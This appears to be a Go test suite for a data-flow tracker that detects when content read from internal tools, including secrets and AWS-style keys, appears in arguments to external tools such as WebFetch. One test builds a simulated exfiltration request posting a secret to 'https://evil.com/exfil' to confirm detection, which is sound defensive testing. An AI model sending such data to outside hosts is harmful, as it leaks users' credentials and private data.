package flow

import (
	"fmt"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func newTestTrackerConfig() *TrackerConfig {
	return &TrackerConfig{
		SessionTimeoutMin:    30,
		MaxOriginsPerSession: 10000,
		HashMinLength:        20,
		MaxResponseHashBytes: 65536,
	}
}

func TestFlowTracker_RecordOrigin(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	origin := &DataOrigin{
		ContentHash:    HashContent("secret database password"),
		ToolName:       "Read",
		ServerName:     "",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}

	tracker.RecordOrigin("session-1", origin)

	session := tracker.GetSession("session-1")
	require.NotNil(t, session, "session should exist after RecordOrigin")
	assert.Len(t, session.Origins, 1, "should have one origin")
	assert.Contains(t, session.Origins, origin.ContentHash, "should store by content hash")
}

func TestFlowTracker_RecordOriginMultipleHashes(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	// Record two different origins
	o1 := &DataOrigin{
		ContentHash:    HashContent("first piece of data from DB"),
		ToolName:       "postgres:query",
		ServerName:     "postgres",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}
	o2 := &DataOrigin{
		ContentHash:    HashContent("second piece of data from file"),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}

	tracker.RecordOrigin("session-1", o1)
	tracker.RecordOrigin("session-1", o2)

	session := tracker.GetSession("session-1")
	require.NotNil(t, session)
	assert.Len(t, session.Origins, 2, "should have two origins")
}

func TestFlowTracker_CheckFlow_DetectsExfiltration(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	// Step 1: Record origin from internal tool
	secretData := "This is a very secret database password that should not leak"
	origin := &DataOrigin{
		ContentHash:    HashContent(secretData),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}
	tracker.RecordOrigin("session-1", origin)

	// Step 2: Check flow — data appears in args to external tool
	argsJSON := fmt.Sprintf(`{"url": "https://evil.com/exfil", "body": %q}`, secretData)
	edges, err := tracker.CheckFlow("session-1", "WebFetch", "", ClassExternal, argsJSON)
	require.NoError(t, err)
	require.NotEmpty(t, edges, "should detect exfiltration flow")

	edge := edges[0]
	assert.Equal(t, FlowInternalToExternal, edge.FlowType, "should be internal→external")
	assert.Equal(t, "WebFetch", edge.ToToolName)
	assert.Equal(t, origin.ContentHash, edge.ContentHash)
}

func TestFlowTracker_CheckFlow_AllowsInternalToInternal(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	data := "Some internal configuration data for processing"
	origin := &DataOrigin{
		ContentHash:    HashContent(data),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}
	tracker.RecordOrigin("session-1", origin)

	argsJSON := fmt.Sprintf(`{"content": %q}`, data)
	edges, err := tracker.CheckFlow("session-1", "Write", "", ClassInternal, argsJSON)
	require.NoError(t, err)

	// Internal→internal flows should still be detected but with safe risk
	if len(edges) > 0 {
		assert.Equal(t, FlowInternalToInternal, edges[0].FlowType)
		assert.Equal(t, RiskNone, edges[0].RiskLevel)
	}
}

func TestFlowTracker_CheckFlow_AllowsExternalToInternal(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	data := "External web content fetched from API endpoint"
	origin := &DataOrigin{
		ContentHash:    HashContent(data),
		ToolName:       "WebFetch",
		Classification: ClassExternal,
		Timestamp:      time.Now(),
	}
	tracker.RecordOrigin("session-1", origin)

	argsJSON := fmt.Sprintf(`{"content": %q}`, data)
	edges, err := tracker.CheckFlow("session-1", "Write", "", ClassInternal, argsJSON)
	require.NoError(t, err)

	// External→internal (ingestion) should be safe
	if len(edges) > 0 {
		assert.Equal(t, FlowExternalToInternal, edges[0].FlowType)
		assert.Equal(t, RiskNone, edges[0].RiskLevel)
	}
}

func TestFlowTracker_CheckFlow_SensitiveDataEscalation(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	secretData := "AKIA1234567890ABCDEF is an AWS access key"
	origin := &DataOrigin{
		ContentHash:      HashContent(secretData),
		ToolName:         "Read",
		Classification:   ClassInternal,
		HasSensitiveData: true,
		SensitiveTypes:   []string{"aws_access_key"},
		Timestamp:        time.Now(),
	}
	tracker.RecordOrigin("session-1", origin)

	argsJSON := fmt.Sprintf(`{"data": %q}`, secretData)
	edges, err := tracker.CheckFlow("session-1", "WebFetch", "", ClassExternal, argsJSON)
	require.NoError(t, err)
	require.NotEmpty(t, edges)

	assert.Equal(t, RiskCritical, edges[0].RiskLevel, "sensitive data flowing externally should be critical risk")
}

func TestFlowTracker_CheckFlow_NoMatchingOrigins(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	// Record one origin
	origin := &DataOrigin{
		ContentHash:    HashContent("origin data content here"),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}
	tracker.RecordOrigin("session-1", origin)

	// Check with completely different data
	argsJSON := `{"url": "https://example.com", "data": "completely unrelated content"}`
	edges, err := tracker.CheckFlow("session-1", "WebFetch", "", ClassExternal, argsJSON)
	require.NoError(t, err)
	assert.Empty(t, edges, "should not detect flow when no origin matches")
}

func TestFlowTracker_CheckFlow_NoSession(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	edges, err := tracker.CheckFlow("nonexistent", "WebFetch", "", ClassExternal, `{"data":"test"}`)
	require.NoError(t, err)
	assert.Empty(t, edges, "should return empty for nonexistent session")
}

func TestFlowTracker_OriginEviction(t *testing.T) {
	cfg := newTestTrackerConfig()
	cfg.MaxOriginsPerSession = 3
	tracker := NewFlowTracker(cfg)
	defer tracker.Stop()

	// Add 4 origins — should evict the oldest one
	for i := 0; i < 4; i++ {
		origin := &DataOrigin{
			ContentHash:    HashContent(fmt.Sprintf("data piece number %d for eviction test", i)),
			ToolName:       "Read",
			Classification: ClassInternal,
			Timestamp:      time.Now().Add(time.Duration(i) * time.Second),
		}
		tracker.RecordOrigin("session-evict", origin)
	}

	session := tracker.GetSession("session-evict")
	require.NotNil(t, session)
	assert.LessOrEqual(t, len(session.Origins), 3, "should evict to stay within MaxOriginsPerSession")
}

func TestFlowTracker_PerFieldHashMatching(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	// Record origin with a long string field
	fieldValue := "This is a confidential database record that should be tracked"
	responseJSON := fmt.Sprintf(`{"id": 1, "secret": %q}`, fieldValue)

	// Record per-field hashes from the response
	fieldHashes := ExtractFieldHashes(responseJSON, 20)
	for hash := range fieldHashes {
		origin := &DataOrigin{
			ContentHash:    hash,
			ToolName:       "postgres:query",
			ServerName:     "postgres",
			Classification: ClassInternal,
			Timestamp:      time.Now(),
		}
		tracker.RecordOrigin("session-field", origin)
	}

	// Check: only the field value appears in the outgoing request (not the full JSON)
	argsJSON := fmt.Sprintf(`{"payload": %q}`, fieldValue)
	edges, err := tracker.CheckFlow("session-field", "WebFetch", "", ClassExternal, argsJSON)
	require.NoError(t, err)
	assert.NotEmpty(t, edges, "should detect flow via per-field hash match")
}

func TestFlowTracker_ConcurrentSessionIsolation(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	var wg sync.WaitGroup
	const numSessions = 10

	// Create independent sessions concurrently
	for i := 0; i < numSessions; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			sessionID := fmt.Sprintf("concurrent-session-%d", idx)
			data := fmt.Sprintf("unique data for session %d padded for length", idx)
			origin := &DataOrigin{
				ContentHash:    HashContent(data),
				ToolName:       "Read",
				Classification: ClassInternal,
				Timestamp:      time.Now(),
			}
			tracker.RecordOrigin(sessionID, origin)

			// Each session should only find its own data
			argsJSON := fmt.Sprintf(`{"data": %q}`, data)
			edges, err := tracker.CheckFlow(sessionID, "WebFetch", "", ClassExternal, argsJSON)
			assert.NoError(t, err)
			assert.NotEmpty(t, edges, "session %d should find its own data", idx)
		}(i)
	}
	wg.Wait()

	// Verify no cross-contamination
	for i := 0; i < numSessions; i++ {
		sessionID := fmt.Sprintf("concurrent-session-%d", i)
		otherData := fmt.Sprintf("unique data for session %d padded for length", (i+1)%numSessions)
		argsJSON := fmt.Sprintf(`{"data": %q}`, otherData)
		edges, err := tracker.CheckFlow(sessionID, "WebFetch", "", ClassExternal, argsJSON)
		require.NoError(t, err)
		if i != (i+1)%numSessions {
			assert.Empty(t, edges, "session %d should NOT find session %d's data", i, (i+1)%numSessions)
		}
	}
}

// === Phase 12: FlowSummary Generation Tests (T110) ===

func TestFlowTracker_GenerateFlowSummary_BasicFields(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	sessionID := "summary-test-session"

	// Record some origins
	o1 := &DataOrigin{
		ContentHash:    HashContent("database record content here for summary"),
		ToolName:       "postgres:query",
		ServerName:     "postgres",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}
	o2 := &DataOrigin{
		ContentHash:      HashContent("sensitive config file with API keys inside"),
		ToolName:         "Read",
		Classification:   ClassInternal,
		HasSensitiveData: true,
		SensitiveTypes:   []string{"api_token"},
		Timestamp:        time.Now(),
	}
	tracker.RecordOrigin(sessionID, o1)
	tracker.RecordOrigin(sessionID, o2)

	// Simulate a flow edge by calling CheckFlow
	argsJSON := fmt.Sprintf(`{"data": %q}`, "database record content here for summary")
	_, _ = tracker.CheckFlow(sessionID, "WebFetch", "", ClassExternal, argsJSON)

	session := tracker.GetSession(sessionID)
	require.NotNil(t, session)

	summary := GenerateFlowSummary(session, "full")

	assert.Equal(t, sessionID, summary.SessionID)
	assert.Equal(t, "full", summary.CoverageMode)
	assert.Equal(t, 2, summary.TotalOrigins)
	assert.GreaterOrEqual(t, summary.TotalFlows, 1)
	assert.NotEmpty(t, summary.ToolsUsed)
	assert.Contains(t, summary.ToolsUsed, "postgres:query")
	assert.Contains(t, summary.ToolsUsed, "Read")
	assert.Contains(t, summary.ToolsUsed, "WebFetch")
}

func TestFlowTracker_GenerateFlowSummary_FlowTypeDistribution(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	sessionID := "summary-dist-session"

	// Record internal origin
	data := "secret data for flow type distribution testing here"
	origin := &DataOrigin{
		ContentHash:    HashContent(data),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}
	tracker.RecordOrigin(sessionID, origin)

	// Generate internal→external flow
	argsJSON := fmt.Sprintf(`{"payload": %q}`, data)
	_, _ = tracker.CheckFlow(sessionID, "WebFetch", "", ClassExternal, argsJSON)

	session := tracker.GetSession(sessionID)
	require.NotNil(t, session)

	summary := GenerateFlowSummary(session, "proxy_only")

	assert.NotNil(t, summary.FlowTypeDistribution)
	assert.Greater(t, summary.FlowTypeDistribution["internal_to_external"], 0,
		"should record internal_to_external in distribution")

	assert.NotNil(t, summary.RiskLevelDistribution)
	// internal→external without sensitive data should be high risk
	assert.Greater(t, summary.RiskLevelDistribution["high"], 0)
}

func TestFlowTracker_GenerateFlowSummary_HasSensitiveFlows(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	sessionID := "summary-sensitive-session"

	// Record sensitive origin
	data := "AKIAIOSFODNN7EXAMPLE_padded_for_minimum_hash_length"
	origin := &DataOrigin{
		ContentHash:      HashContent(data),
		ToolName:         "Read",
		Classification:   ClassInternal,
		HasSensitiveData: true,
		SensitiveTypes:   []string{"aws_access_key"},
		Timestamp:        time.Now(),
	}
	tracker.RecordOrigin(sessionID, origin)

	// Generate flow with sensitive data
	argsJSON := fmt.Sprintf(`{"data": %q}`, data)
	_, _ = tracker.CheckFlow(sessionID, "WebFetch", "", ClassExternal, argsJSON)

	session := tracker.GetSession(sessionID)
	summary := GenerateFlowSummary(session, "full")

	assert.True(t, summary.HasSensitiveFlows, "summary should flag sensitive flows")
	assert.Greater(t, summary.RiskLevelDistribution["critical"], 0)
}

func TestFlowTracker_GenerateFlowSummary_EmptySession(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	// Create an empty session
	tracker.RecordOrigin("empty-session", &DataOrigin{
		ContentHash:    HashContent("just one origin with no flows here"),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	})

	session := tracker.GetSession("empty-session")
	require.NotNil(t, session)

	summary := GenerateFlowSummary(session, "proxy_only")

	assert.Equal(t, "empty-session", summary.SessionID)
	assert.Equal(t, 1, summary.TotalOrigins)
	assert.Equal(t, 0, summary.TotalFlows)
	assert.False(t, summary.HasSensitiveFlows)
	assert.Empty(t, summary.FlowTypeDistribution)
	assert.Empty(t, summary.RiskLevelDistribution)
}

func TestFlowTracker_GenerateFlowSummary_LinkedSessions(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	sessionID := "summary-linked"
	tracker.RecordOrigin(sessionID, &DataOrigin{
		ContentHash:    HashContent("linked session data origin content"),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	})

	session := tracker.GetSession(sessionID)
	require.NotNil(t, session)

	// Manually set linked sessions
	session.mu.Lock()
	session.LinkedMCPSessions = []string{"mcp-session-1", "mcp-session-2"}
	session.mu.Unlock()

	summary := GenerateFlowSummary(session, "full")
	assert.Equal(t, []string{"mcp-session-1", "mcp-session-2"}, summary.LinkedMCPSessions)
}

func TestFlowTracker_ExpiryCallback_Called(t *testing.T) {
	cfg := &TrackerConfig{
		SessionTimeoutMin:    0, // Will use manual expiry
		MaxOriginsPerSession: 10000,
		HashMinLength:        20,
		MaxResponseHashBytes: 65536,
	}
	tracker := NewFlowTracker(cfg)
	defer tracker.Stop()

	var callbackCalled bool
	var receivedSummary *FlowSummary
	tracker.SetExpiryCallback(func(summary *FlowSummary) {
		callbackCalled = true
		receivedSummary = summary
	})

	// Create a session
	tracker.RecordOrigin("expiry-callback-test", &DataOrigin{
		ContentHash:    HashContent("data for expiry callback testing purpose"),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	})

	// Force session to look expired by setting LastActivity in the past
	session := tracker.GetSession("expiry-callback-test")
	require.NotNil(t, session)
	session.mu.Lock()
	session.LastActivity = time.Now().Add(-1 * time.Hour)
	session.mu.Unlock()

	// Manually trigger expiry
	tracker.expireSessions()

	assert.True(t, callbackCalled, "expiry callback should have been called")
	require.NotNil(t, receivedSummary)
	assert.Equal(t, "expiry-callback-test", receivedSummary.SessionID)
	assert.Equal(t, 1, receivedSummary.TotalOrigins)
}

func TestFlowTracker_ToolsUsedTracking(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	origin := &DataOrigin{
		ContentHash:    HashContent("some tracked content here"),
		ToolName:       "Read",
		Classification: ClassInternal,
		Timestamp:      time.Now(),
	}
	tracker.RecordOrigin("session-tools", origin)

	session := tracker.GetSession("session-tools")
	require.NotNil(t, session)
	assert.True(t, session.ToolsUsed["Read"], "Read should be tracked in ToolsUsed")
}

// TestFlowTracker_CheckFlow_ConcurrentRace is a regression test for the race condition
// fix where CheckFlow used RLock but modified session fields (LastActivity, ToolsUsed, Flows).
// The fix changed line 80 from RLock to Lock to properly synchronize write access.
func TestFlowTracker_CheckFlow_ConcurrentRace(t *testing.T) {
	tracker := NewFlowTracker(newTestTrackerConfig())
	defer tracker.Stop()

	sessionID := "concurrent-race-session"

	// Record multiple origins with different content to create potential flow edges
	origins := []string{
		"database record one with sufficient length for hashing",
		"database record two with sufficient length for hashing",
		"database record three with sufficient length for hashing",
		"database record four with sufficient length for hashing",
		"database record five with sufficient length for hashing",
	}

	for i, data := range origins {
		origin := &DataOrigin{
			ContentHash:    HashContent(data),
			ToolName:       fmt.Sprintf("Read-%d", i),
			Classification: ClassInternal,
			Timestamp:      time.Now(),
		}
		tracker.RecordOrigin(sessionID, origin)
	}

	// Prepare test cases with concurrent CheckFlow calls
	testCases := []struct {
		toolName  string
		data      string
		shouldHit bool
	}{
		{"WebFetch-1", origins[0], true},
		{"WebFetch-2", origins[1], true},
		{"WebFetch-3", origins[2], true},
		{"WebFetch-4", "unrelated data that does not match", false},
		{"WebFetch-5", origins[3], true},
	}

	var wg sync.WaitGroup
	errChan := make(chan error, len(testCases)*3+5)

	// Spawn concurrent CheckFlow goroutines (3 iterations per test case)
	for _, tc := range testCases {
		for iteration := 0; iteration < 3; iteration++ {
			wg.Add(1)
			go func(toolName, data string, shouldHit bool) {
				defer wg.Done()
				argsJSON := fmt.Sprintf(`{"payload": %q}`, data)
				edges, err := tracker.CheckFlow(sessionID, toolName, "", ClassExternal, argsJSON)
				if err != nil {
					errChan <- fmt.Errorf("CheckFlow error for %s: %w", toolName, err)
					return
				}
				if shouldHit && len(edges) == 0 {
					errChan <- fmt.Errorf("expected flow edge for %s but got none", toolName)
					return
				}
				if !shouldHit && len(edges) > 0 {
					errChan <- fmt.Errorf("unexpected flow edge for %s", toolName)
					return
				}
			}(tc.toolName, tc.data, tc.shouldHit)
		}
	}

	// Also spawn concurrent RecordOrigin goroutines to increase contention
	for i := 0; i < 5; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			newData := fmt.Sprintf("concurrent origin data number %d with sufficient length", idx)
			origin := &DataOrigin{
				ContentHash:    HashContent(newData),
				ToolName:       fmt.Sprintf("ConcurrentTool-%d", idx),
				Classification: ClassInternal,
				Timestamp:      time.Now(),
			}
			tracker.RecordOrigin(sessionID, origin)
		}(i)
	}

	// Wait for all goroutines to complete
	wg.Wait()
	close(errChan)

	// Check for errors
	var errors []error
	for err := range errChan {
		errors = append(errors, err)
	}
	require.Empty(t, errors, "concurrent operations should not produce errors: %v", errors)

	// Verify session state is consistent
	session := tracker.GetSession(sessionID)
	require.NotNil(t, session, "session should exist after concurrent operations")

	// Verify origins are recorded (initial 5 + concurrent 5)
	assert.GreaterOrEqual(t, len(session.Origins), 5, "should have at least initial origins")

	// Verify flows were detected
	assert.Greater(t, len(session.Flows), 0, "should have detected some flows")

	// Verify ToolsUsed is populated (this field is modified by CheckFlow)
	assert.NotEmpty(t, session.ToolsUsed, "ToolsUsed should be populated")
	for _, tc := range testCases {
		if tc.shouldHit {
			assert.True(t, session.ToolsUsed[tc.toolName], "%s should be in ToolsUsed", tc.toolName)
		}
	}

	// Verify LastActivity was updated (this field is modified by CheckFlow)
	assert.False(t, session.LastActivity.IsZero(), "LastActivity should be set")
	assert.True(t, time.Since(session.LastActivity) < 2*time.Second, "LastActivity should be recent")
}
